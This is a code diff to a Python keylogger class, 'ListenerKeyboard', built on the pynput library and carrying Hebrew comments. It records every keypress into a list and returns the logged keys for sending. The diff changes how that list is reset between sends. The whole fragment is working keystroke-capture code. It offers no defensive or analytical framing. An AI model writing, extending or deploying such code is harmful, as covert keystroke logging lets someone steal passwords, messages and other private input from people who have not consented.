@@ -1,3 +1,5 @@
+import time
+
 from pynput.keyboard import Listener
 from interface_agent import IKeyLogger
 
@@ -7,6 +9,7 @@ class ListenerKeyboard(IKeyLogger):
         self.list = []
         self.listener = Listener(on_press=self.on_press)
         self.send = False
+        self.the_final_list = []
 
     # מתחיל להאזין להקשות במקלדת
     def start_logging(self) -> None:
@@ -18,9 +21,12 @@ class ListenerKeyboard(IKeyLogger):
 
     # מחזיר מערך עם את כל ההקשות במקלדת שנשמרו
     def get_logged_keys(self) -> list[str]:
-        the_final_list = self.list
+        if not self.send: # מוודא שנוספו הקשות חדשות והמערך המקורי התאפס
+            self.the_final_list = self.list
+        else:
+            self.the_final_list = []
         self.send = True
-        return the_final_list
+        return self.the_final_list
 
     # לוקח את התו שהוקש במקלדת, מסדר את התו שיהיה מסודר ושולח לפונקציה ששאחראית להכניס למערך
     def on_press(self,key):
@@ -40,3 +46,4 @@ class ListenerKeyboard(IKeyLogger):
             self.list = []
             self.send = False
         self.list.append(key)
+
